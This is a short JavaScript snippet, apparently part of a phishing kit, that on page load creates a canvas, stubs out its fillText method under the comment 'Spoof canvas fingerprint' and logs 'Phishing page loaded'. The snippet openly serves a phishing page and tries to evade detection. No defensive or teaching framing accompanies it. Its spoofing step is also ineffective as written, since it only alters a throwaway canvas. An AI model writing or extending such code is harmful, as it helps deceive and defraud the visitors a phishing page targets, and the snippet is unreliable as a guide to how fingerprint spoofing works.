// Anti-Detection + Analytics
window.addEventListener('load', () => {
  // Spoof canvas fingerprint
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.fillText = () => {};
  
  console.log('✅ Phishing page loaded');
});
